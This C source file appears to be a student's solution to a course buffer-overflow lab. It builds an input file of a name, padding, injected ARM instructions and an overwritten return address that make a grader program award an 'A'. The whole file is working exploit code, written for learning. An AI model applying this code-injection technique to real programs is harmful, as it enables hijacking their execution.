/*-------------------------------------------------------------------*/
/* createdataA.c                                                     */
/* Author: Emily Qian, Claire Shin                                   */
/*-------------------------------------------------------------------*/

/*
 * Produces a file called dataA with the student name, 
 * a null terminator, padding to overrun the stack, and 
 * injected instructions (via mini-assembler functions) 
 * that will modify the saved return address and grade variable
 * to cause the grader to assign an 'A' grade. 
 */
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include "miniassembler.h"

/*
 * This main function takes no command-line arguments and does not 
 * read from stdin. It writes a sequence of bytes (student name, 
 * null-padding, and a return address) to the "dataA" file. 
 * These bytes use buffer overrun in the grader program
 * to modify the saved return address and grade variable. 
 * On success, main writes nothing to stdout.
 * On failure, main prints an error message to stderr and returns 1.
 */
int main() {
    FILE *psFile; 
    unsigned int MOV, STRB, ADR, B; 
    int i; 

    /* 0x420078 is the return address, which is name[32] */
    const unsigned int returnAddress = 0x420078;

    /* write name and null terminator to file. 
    return error code if opening fails. */ 
    psFile = fopen("dataA", "wb");
    if (psFile == NULL) {
        perror("Error opening file"); 
        return 1; 
    }
    fprintf(psFile, "%s", "Shin Qian"); 

    /* add padding so that buffer overflow can be performed. 
    48 - 9 (length of name) - 16 (space for the 4 lines of code)= 23 */ 
    for (i = 0; i < 23; i++) {
        fputc(0x00, psFile);
    }

    /* MOV X0, 'A'
    MOV grade A to register W0 using MiniAssembler */
    MOV = MiniAssembler_mov(0, 65); /* 65 is ASCII code of A */
    fwrite(&MOV, sizeof(unsigned int), 1, psFile);

    /* ADR X1, grade */
    /* 0x420044 is address of grade variable, 
    0x42007c holds name[36], a reference point for ADR instruction */
    ADR = MiniAssembler_adr(1, 0x420044, 0x42007c);
    fwrite(&ADR, sizeof(unsigned int), 1, psFile);

    /* STRB W0, X1 
    STR A in register W0 into the address pointed by X1, 
    return back to normal program flow after setting grade to A */
    STRB = MiniAssembler_strb(0, 1);
    fwrite(&STRB, sizeof(unsigned int), 1, psFile);

    /* B back to return address */ 
    /* 0x40089c is instruction address that prints "is your grade"
    0x420084 is name[44], a reference point for B instruction */
    B = MiniAssembler_b(0x40089c, 0x420084);
    fwrite(&B, sizeof(unsigned int), 1, psFile);

    /* overwrite return address */
    fwrite(&returnAddress, sizeof(unsigned int), 1, psFile);

    /* close file and return 0 */
    fclose(psFile);
    return 0;

}
